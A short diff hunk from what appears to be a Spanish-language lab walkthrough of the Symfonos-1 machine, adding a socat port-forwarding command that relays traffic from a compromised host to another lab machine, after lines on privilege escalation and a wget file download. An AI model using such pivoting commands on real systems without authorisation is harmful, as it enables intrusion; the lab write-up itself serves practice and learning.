@@ -533,6 +533,10 @@ explotando este binario logramos conseguir una bash con privilegios elevados
 	wget http://10.0.2.5:1441/archivo
 
 	*Maquina Symfonos-1*
+	./socat TCP-LISTEN:1441,fork TCP:10.2.2.7:9999
+
+	*abrimos un puerto en la maquina Symfonos-1 (1441) y vamos a enviar todo lo que llegue a ese puerto hacia el servidor de Python*
+
 	
 ```
 
